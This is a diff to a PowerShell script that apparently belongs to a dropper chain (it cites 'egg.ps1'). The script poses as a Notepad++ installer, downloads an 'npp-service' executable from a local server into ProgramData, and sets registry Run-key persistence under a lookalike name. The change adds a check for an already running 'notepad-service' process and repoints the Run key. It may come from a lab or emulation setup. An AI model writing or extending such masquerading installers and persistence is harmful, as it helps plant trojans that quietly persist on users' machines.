@@ -24,6 +24,14 @@ if (-not (Test-Path "C:\Program Files\Notepad++")) {
     New-Item -ItemType Directory -Path "C:\Program Files\Notepad++" -Force | Out-Null
 }
 
+$notepadProcess = Get-Process -Name "notepad-service" -ErrorAction SilentlyContinue
+
+if (-not ($notepadProcess.Length -eq 0)) {
+    # If process is running, exit to avoid conflicts
+    exit 0
+    
+}
+
 # Download Notepad++ Installer
 # Assuming these files were dropped into TEMP by the dropper (egg.ps1)
 if (Test-Path "$env:TEMP\npp.exe") {
@@ -56,7 +64,7 @@ Invoke-RestMethod -Uri "http://localhost:8080/npp-service" -OutFile "C:\ProgramD
 Log-Msg "Setting Persistence..."
 $runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 # Use double quotes for the argument in the registry string to ensure Windows handles it correctly
-New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"C:\ProgramData\npp\notepad-service.exe`"" -PropertyType String -Force
+New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"C:\Program Files\Notepad++\notepad++.exe`"" -PropertyType String -Force
 
 # 3. FIX: Simplified Task Action to call Executable directly
 # The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
